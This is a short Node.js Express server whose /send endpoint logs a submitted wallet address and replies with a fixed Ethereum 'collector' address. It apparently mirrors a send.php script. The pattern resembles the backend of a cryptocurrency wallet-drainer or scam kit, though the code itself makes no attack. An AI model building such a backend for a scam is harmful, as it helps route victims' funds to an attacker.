const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// ⭐ same as send.php
app.post("/send", (req, res) => {

    const address = req.body.address || "none";

    console.log("User:", address);

    res.json({
        status: "success",
        collector: "0x5681d680b047bf5b12939625c56301556991005e"
    });
});

// health check
app.get("/", (req, res) => {
    res.send("API WORKING ✅");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () =>
    console.log("Server running on port", PORT)
);
